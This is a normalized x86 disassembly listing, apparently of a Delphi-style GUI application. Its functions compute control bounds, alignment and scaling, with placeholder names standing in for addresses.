pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov ecx [ ebx ]
mov edx ecx
cmp eax edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_48d5c4
mov edx [ esp ]
mov eax esi
call sub_48d590
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_48d890
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_48d8d4
sub_490580
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_432a5c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_48d98c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x4c ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_432b40
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_48d83c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49060c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_490500
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x14 ] ebx
mov eax ebx
call sub_496868
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_490580
pop ecx
jmp r-xdata
sub_49066c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_49075c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_490763
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_48dfa0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_48df68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x4c ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_48df68
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call j_sub_44a294
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_449d2c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_48deb0
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x110 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x114 ] eax
cmp [ esi + 0x112 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_49076c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4483f8
sub_490798
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4907b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4907d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4907f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_490818
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_490838
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_490858
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42e6f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_48d40c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4483f8
sub_490890
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_49092d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424e90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
mov edx eax
mov edi esi
mov eax edi
call sub_451830
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_451a1c
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4516c8
movzx edx [ ebx + 0x57 ]
mov eax edi
call sub_451b3c
push [ ebx + 0x114 ]
push [ ebx + 0x110 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_490934
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_49093c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fwait
fnstsw ax
sahf
jae r-xdata
sub_490978
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_49093c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_490a28
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
mov eax [ ebx + 0x90 ]
call sub_448388
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_490a5c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
sub_490a7c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc7
call sub_4483f8
test al al
je r-xdata
mov eax edi
call sub_490abc
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_490ae8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov edi [ ebx + 0x68 ]
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebp + 0x8 ]
lea edx [ esi + 0x38 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x84 ]
test al al
jne r-xdata
mov [ ebp + 0xc ] 0x1
sub_490b18
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x12 ] eax
movsx eax [ esp + 0x12 ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x18 ]
mov [ esp ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_423034
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_48dac0
lea edx [ esp + 0x20 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
lea edx [ esp + 0x8 ]
call sub_432a8c
test al al
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe7
call sub_4483f8
movzx eax [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd7
call sub_4483f8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx edi
mov eax edi
call sub_48daec
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_423034
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x30 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ esp + 0x30 ]
mov ecx esp
mov eax edi
call sub_48d98c
sub_490c58
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_490c98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_490d98
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
test eax eax
je r-xdata
test eax eax
jne r-xdata
cmp esi eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_490d9f
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ eax + 0x30 ]
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
sub_490da8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48ea08
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_490de8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_490de0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
and [ esi + 0x50 ] 0xffefffff
or [ esi + 0x50 ] 0x100000
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x58 ]
sub_490e18
test [ eax + 0x55 ] 0x40
jne r-xdata
retn
test [ eax + 0x1c ] 0x2
jne r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x18c ] edx
mov edx [ eax + 0x44 ]
mov [ eax + 0x190 ] edx
mov edx [ eax + 0x48 ]
mov [ eax + 0x194 ] edx
mov edx [ eax + 0x4c ]
mov [ eax + 0x198 ] edx
sub_490eec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48c898
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_490f20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_491051
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_48ccfc
push ebx
push sub_4932a0
call sub_42f338
mov [ ebx + 0x250 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov esi eax
mov [ ebx + 0x1b8 ] esi
mov edx [ ebx + 0x6c ]
mov eax esi
call sub_46df1c
mov [ ebx + 0x254 ] 0x0
mov [ ebx + 0x1e6 ] 0x1
mov [ ebx + 0x1e5 ] 0x1
mov [ ebx + 0x1dc ] 0xffffffff
mov [ ebx + 0x1c4 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_448694
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fb48
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x1c8 ]
call sub_449d2c
lea eax [ ebx + 0x1c8 ]
xor edx edx
call sub_449d2c
jmp r-xdata
mov [ ebx + 0x1e3 ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x1a6 ] al
mov [ ebx + 0x1a7 ] 0x2
mov [ ebx + 0x1a8 ] 0x1
mov [ ebx + 0x1ac ] 0x1
mov [ ebx + 0x158 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_49c68c
mov esi eax
mov [ ebx + 0x1b4 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_497df8
mov [ ebx + 0x1e7 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491058
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
sub_491058
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49107c
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
mov eax ebp
call sub_42e534
cmp [ ebp + 0x1e4 ] 0x0
je r-xdata
lea eax [ ebp + 0x1c0 ]
call sub_44b8d8
mov eax [ ebp + 0x1bc ]
call sub_4481b0
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov [ ebp + 0x1e4 ] 0x0
xor edx edx
mov eax ebp
call sub_48b790
cmp [ ebp + 0x24c ] 0x0
je r-xdata
mov dl 0x1
mov eax ebp
call sub_492298
mov eax ebp
call sub_492534
mov esi eax
test esi esi
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ ebp + 0x1b8 ]
call sub_4481b0
mov eax [ ebp + 0x250 ]
test eax eax
je r-xdata
mov edx esi
dec edx
mov eax ebp
call sub_4924f8
mov edi eax
mov edx edi
mov eax ebp
call sub_492304
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax ebp
call sub_492534
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0x1b4 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_48ce0c
test bl bl
jle r-xdata
call sub_42f3d0
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
sub_49115c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d8 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_491220
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_424970
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_496ad0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
mov edx esi
call sub_4246e8
mov edx [ eax + 0x1dc ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_424850
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4246e8
test eax eax
je r-xdata
sub_491230
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492038
xor eax eax
push ebp
push sub_491270
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48d154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491277
mov eax [ ebp - 0x4 ]
call sub_492040
retn
sub_491277
mov eax [ ebp - 0x4 ]
call sub_49115c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4930c8
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_48f2b0
sub_4912a8
mov ecx [ eax + 0x1b4 ]
mov ecx [ ecx + 0x8 ]
add [ edx ] ecx
mov ecx [ eax + 0x1b4 ]
mov ecx [ ecx + 0xc ]
add [ edx + 0x4 ] ecx
mov ecx [ eax + 0x1b4 ]
mov ecx [ ecx + 0x10 ]
sub [ edx + 0x8 ] ecx
mov eax [ eax + 0x1b4 ]
mov eax [ eax + 0x14 ]
sub [ edx + 0xc ] eax
retn
sub_4912d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x184 ] 0x0
je r-xdata
movzx eax [ ebp + 0x14 ]
movzx eax [ eax + rw-data ]
cmp al [ esi + 0x61 ]
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x188 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
test [ esi + 0x61 ] 0x4
je r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp + 0x14 ]
add al 0xfd
sub al 0x2
jb r-xdata
test [ esi + 0x61 ] 0x1
jne r-xdata
test [ esi + 0x61 ] 0x1
je r-xdata
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
movzx eax [ ebp + 0x14 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
test [ esi + 0x61 ] 0x8
je r-xdata
mov eax [ esi + 0x184 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x174 ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x184 ]
sub edx [ esi + 0x174 ]
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x184 ]
sub edx [ esi + 0x174 ]
sub eax edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x74 ]
call sub_49c7a4
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
jmp [ eax * 4 + jump_table_49153b ]
sub al 0x3
jne r-xdata
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
test [ esi + 0x61 ] 0x2
jne r-xdata
test [ esi + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
movzx eax [ ebp + 0x14 ]
cmp eax 0x5
ja r-xdata
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0x14 ]
add [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub [ edi + 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xac ]
mov eax [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] eax
movzx eax [ ebp + 0x14 ]
cmp eax 0x6
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x178 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x188 ]
sub edx [ esi + 0x178 ]
sub eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x188 ]
sub edx [ esi + 0x178 ]
sub eax edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_491603 ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x74 ]
call sub_49c7a4
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
sub [ edi + 0x4 ] edx
jmp r-xdata
mov edx 0x3
